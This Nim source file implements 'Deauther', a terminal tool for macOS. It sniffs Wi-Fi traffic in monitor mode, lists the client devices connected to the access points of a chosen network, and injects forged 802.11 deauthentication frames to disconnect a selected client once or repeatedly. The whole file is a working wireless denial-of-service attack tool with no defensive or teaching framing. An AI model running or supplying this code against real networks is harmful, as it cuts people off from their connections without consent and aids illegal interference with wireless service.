import strutils, os, options, tables, times, strformat, asyncdispatch, logging
import algorithm, future, httpclient

import pcap/[wrapper, async]
import corewlan
import nimbox
import oui

import radiotap, packet, tui, listboxlogger

type
  Stage = enum
    Menu, SelectSSID, PacketSniffing

  Deauther = ref object
    nb: NimBox
    current: Stage
    currentSSID: string
    crcFails: int
    macsBox, ssidBox: ListBox
    messagesOverlay: bool
    logger: ListBoxLogger
    deauthTarget: Option[string] ## MAC address we are targeting.
    singleDeauthMode: bool
    ouiData: OuiData
    refreshRate: int ## How long to wait before each packet refresh.
    channelSwitchRate: int ## How long to listen for packets on each channel.
    currentChannel: Option[CWChannel] ## Current channel being scanned.
    apCount: int ## Number of access points with the selected SSID being scanned.

proc getPacket(pcap: AsyncPcap,
               deauther: Deauther): Future[Option[(Radiotap, Packet)]] {.async.} =
  let data = await pcap.readPacket()

  let radiotap = parseRadiotap(data)
  if radiotap.header.len.int >= data.len:
    return none((Radiotap, Packet))

  let packet = parsePacket(radiotap.data)
  if packet.calculatedFCS != packet.receivedFCS:
    deauther.crcFails.inc()
    return none((Radiotap, Packet))
  return some((radiotap, packet))

proc monitor(): AsyncPcap =
  # Set up PCAP.
  var err = newString(PCAP_ERRBUF_SIZE)
  var p = pcap_open_live(defaultIfName, 65536.cint, 1.cint, 1.cint, addr(err))

  if p.isNil():
    raise newException(OSError, "Could not open pcap")

  p.checkError p.pcap_set_datalink(DLT_IEEE802_11_RADIO)

  return p.newAsyncPcap()

proc writePacket(p: AsyncPcap, packet: Packet): Future[void] =
  var packetData = packet.serialize()
  var radiotapLen = 8'u16
  var radiotapData = newString(packetData.len + radiotapLen.int)
  copyMem(addr radiotapData[2], addr radiotapLen, 2)
  copyMem(addr radiotapData[radiotapLen.int],
          addr packetData[0], packetData.len)
  return p.writePacket(radiotapData)

type
  MACStats = tuple
    tx, rx: int
    ch: CWChannel
    rssi, deauths: int
    lastPacketFrom: string ## MAC address where the last packet was seen from

proc getInit(table: var OrderedTable[string, MACStats],
             key: string): var MACStats =
  if key notin table:
    table[key] = (0, 0, nil, 0, 0, "").MACStats
  return table[key]

proc `$`(chan: CWChannel): string =
  return fmt"{chan.channelNumber} ({($chan.channelBand)[14 .. ^1]}, " &
         fmt"{($chan.channelWidth)[15 .. ^1]})"

proc gatherMacs(deauther: Deauther) {.async.} =
  let wfc = sharedWiFiClient()
  let wif = wfc.getInterface()

  info("Disassociating...")
  wif.disassociate()

  # Set up PCAP.
  var p = monitor()

  var accessPoints = initTable[string, CWNetwork]()
  # Figure out the MAC addresses and channels of the APs we should be looking at.
  let networks = wif.cachedScanResults()
  for network in items(CWNetwork, networks.allObjects()):
    let ssid = $network.ssid.toCString()

    if ssid == deauther.currentSSID:# and network.rssiValue > -70:
      let bssid = ($network.bssid.toCString()).toUpperAscii()
      accessPoints[bssid] = network

  deauther.apCount = accessPoints.len

  # Set up storage for MAC addresses.
  var macs = initOrderedTable[
    string,
    MACStats
  ]()
  while deauther.current == PacketSniffing:
    for bssid, network in accessPoints:
      # Switch to network's channel.
      info("Switching to ", network.wlanChannel)
      info("Looking for packets from/to ", bssid)
      wif.setWLANChannel(network.wlanChannel)
      deauther.currentChannel = some(network.wlanChannel)

      info(fmt"Reading packets for {deauther.channelSwitchRate/1000}s...")
      let startTime = epochTime()
      while epochTime() - startTime < deauther.channelSwitchRate/1000:
        let packetFut = getPacket(p, deauther)
        yield packetFut
        if packetFut.failed:
          error("Failed ", packetFut.error.msg)
        elif packetFut.read.isNone():
          discard
        else:
          let (radiotap, packet) = packetFut.read.get()
          let addr1 = $packet.header.address1
          let addr2 = $packet.header.address2
          # How are address fields used?
          # http://80211notes.blogspot.co.uk/2013/09/understanding-address-fields-in-80211.html

          # Only care about packets transmitted to or from current network...
          # TODO: Compare BSSID in a better way, this toUpper/toLower conversion
          # is pretty error prone. Comparing numbers would be better.
          if bssid notin [addr1, addr2]:
            debug("Skipping ", addr1, "<-", addr2)
            continue

          macs.getInit(addr1).rx.inc()
          macs.getInit(addr1).ch = network.wlanChannel
          macs.getInit(addr1).rssi =
            radiotap.antennaSignal.int
          macs.getInit(addr1).lastPacketFrom = addr2
          macs.getInit(addr2).tx.inc()
          macs.getInit(addr2).ch = network.wlanChannel
          macs.getInit(addr2).rssi =
            radiotap.antennaSignal.int
          macs.getInit(addr2).lastPacketFrom = addr1

      if deauther.deauthTarget.isSome:
        let target = deauther.deauthTarget.get()
        # Only deauth if last packet from target was sent to current BSSID.
        if macs.getInit(target).lastPacketFrom == bssid:
          info("Deauthing ", target)
          let packet = initDeauthenticationPacket(target, bssid, bssid)
          await p.writePacket(packet)
          macs.getInit(target).deauths.inc()
          macs.getInit(bssid).deauths.inc()

          if deauther.singleDeauthMode:
            deauther.deauthTarget = none(string)

    # Update UI
    let previousSelection = deauther.macsBox.getSelectedRow()
    macs.sort((x, y) => -cmp(x[1].tx + x[1].rx, y[1].tx + y[1].rx))
    deauther.macsBox.clear()
    for key, value in macs:
      if key in ["FF:FF:FF:FF:FF:FF", "00:00:00:00:00:00"]: continue

      let ouiOctets = key[0 ..< 8]
      let vendor =
        if ouiOctets in deauther.ouiData: deauther.ouiData[ouiOctets].company
        else: ""

      let value = @[
        key, $value.tx, $value.rx, $value.ch.channelNumber, $value.rssi,
        $value.deauths, vendor
      ]

      if key in accessPoints:
        deauther.macsBox.add(value, fg=clrBlue)
      elif deauther.deauthTarget.get("") == key:
        deauther.macsBox.add(value, fg=clrRed)
      else:
        deauther.macsBox.add(value)

    # Keep selection constant
    if previousSelection.isSome():
      deauther.macsBox.select(previousSelection.get()[0], col=0)

    deauther.currentChannel = none(CWChannel)
    await sleepAsync(deauther.refreshRate)

proc selectSSID(deauther: Deauther) {.async.} =
  let wfc = sharedWiFiClient()
  let wif = wfc.getInterface()

  while deauther.current == SelectSSID:
    deauther.ssidBox.clear()

    # In case we ever want to probe manually. This explains how the OS does it
    # https://networkengineering.stackexchange.com/a/17225/46039

    let networks = wif.cachedScanResults()
    for network in items(CWNetwork, networks.allObjects()):
      deauther.ssidBox.add(@[
        $network.ssid.toCString(), $network.bssid.toCString(),
        $network.wlanChannel.channelNumber,
        $network.rssiValue
      ])

    deauther.ssidBox.sort((x, y) => cmp(x[3], y[3]))

    await sleepAsync(1000)

proc newDeauther(): Deauther =
  if not fileExists("oui.txt"):
    echo("No oui.txt found, downloading...")
    var client = newHttpClient()
    client.downloadFile("http://standards-oui.ieee.org/oui/oui.txt", "oui.txt")

  result = Deauther(
    nb: newNimbox(),
    current: Menu,
    currentSSID: "",
    macsBox: newListBox(
      70, 20,
      initListBoxData(@["MAC", "Tx", "Rx", "Ch", "📶", "D", "Vendor"])
    ),
    ssidBox: newListBox(
      80, 20,
      initListBoxData(@["SSID", "BSSID", "Channel", "📶"])
    ),
    ouiData: parseOui("oui.txt"),
    refreshRate: 200,
    channelSwitchRate: 300
  )

  let wfc = sharedWiFiClient()
  let wif = wfc.getInterface()

  result.currentSSID = $toCString(wif.ssid())

proc draw(deauther: Deauther) =
  deauther.nb.clear()

  # Draw title header
  deauther.nb.drawTitle("Deauther")

  var controls: seq[(string, string)] = @[]
  var stats = @[
    ("SSID", deauther.currentSSID)
  ]

  case deauther.current
  of Menu:
    controls =
      @({ "1": "SSID", "2": "Scan"}) & controls
  of SelectSSID:
    deauther.nb.draw(deauther.ssidBox, 3)
  of PacketSniffing:
    let target = deauther.deauthTarget
    let chan = deauther.currentChannel
    stats &= @({
      "APs": $deauther.apCount,
      "CRC fails": $deauther.crcFails,
      "Mode":
        if deauther.singleDeauthMode: "Manual" else: "Auto",
      "Refresh rate": fmt"{deauther.refreshRate}ms",
      "Channel switch rate": fmt"{deauther.channelSwitchRate}ms",
      "Status":
        if target.isSome(): "Deauthing " & target.get()
        elif chan.isSome(): "Scanning " & $chan.get()
        else: "Idle"
    })

    if target.isSome():
      controls =
        @({
          "Enter": "Change target",
          "Space": "Stop deauthing"
        }) & controls
    else:
      controls =
        @({ "Enter": "Deauth"}) & controls

    controls &= @({
      "Tab": "Change mode",
      "F5/F6": "+/- refresh",
      "F7/F8": "+/- chan"
    })

    # Draw list box.
    deauther.nb.draw(deauther.macsBox, 3)

  deauther.nb.drawStats(stats)

  controls &= @[("BkSpc", "Main Menu"), ("Q", "Quit")]
  deauther.nb.drawControls(controls)

  if deauther.messagesOverlay:
    deauther.nb.draw(deauther.logger.lb, 3)

  deauther.nb.present()

proc onEnter(deauther: Deauther) =
  case deauther.current
  of PacketSniffing:
    let row = deauther.macsBox.getSelectedRow()
    deauther.deauthTarget = row.map(r => r[0])
  of SelectSSID:
    deauther.currentSSID = deauther.ssidBox.getSelectedRow().get()[0]
  else:
    discard

proc onSpace(deauther: Deauther) =
  case deauther.current
  of PacketSniffing:
    deauther.deauthTarget = none(string)
  else:
    discard

proc onTab(deauther: Deauther) =
  case deauther.current
  of PacketSniffing:
    deauther.singleDeauthMode = not deauther.singleDeauthMode
  else:
    discard

proc run(deauther: Deauther) =
  # Set up UI elements.
  deauther.logger = newListBoxLogger()
  deauther.logger.levelThreshold = lvlInfo
  addHandler(deauther.logger)

  info("Started deauther")

  let listBoxes = [deauther.logger.lb, deauther.macsBox, deauther.ssidBox]
  # Run event loop.
  var evt: Event
  while true:
    deauther.draw()

    if hasPendingOperations():
      poll()

    evt = deauther.nb.peekEvent(100)
    case evt.kind:
      of EventType.Key:
        case evt.sym
        of Symbol.Escape:
          break
        of Symbol.Backspace:
          deauther.current = Menu
        of Symbol.Enter:
          deauther.onEnter()
        of Symbol.Space:
          deauther.onSpace()
        of Symbol.Tab:
          deauther.onTab()
        of Symbol.F5:
          deauther.refreshRate -= 10
        of Symbol.F6:
          deauther.refreshRate += 10
        of Symbol.F7:
          deauther.channelSwitchRate -= 10
        of Symbol.F8:
          deauther.channelSwitchRate += 10
        of Symbol.Character:
          case evt.ch
          of 'q': break
          of 'm':
            deauther.messagesOverlay = not deauther.messagesOverlay
          of '1':
            if deauther.current == Menu:
              deauther.current = SelectSSID
              asyncCheck selectSSID(deauther)
          of '2':
            if deauther.current == Menu:
              deauther.current = PacketSniffing
              asyncCheck gatherMacs(deauther)
          else:
            info("Key pressed: ", evt.ch)
        of Symbol.Down:
          for lb in listBoxes:
            lb.onDown()
        of Symbol.Up:
          for lb in listBoxes:
            lb.onUp()
        else: discard
      else: discard

when isMainModule:
  let deauther = newDeauther()

  try:
    deauther.run()
    deauther.nb.shutdown()
  except:
    deauther.nb.shutdown()
    raise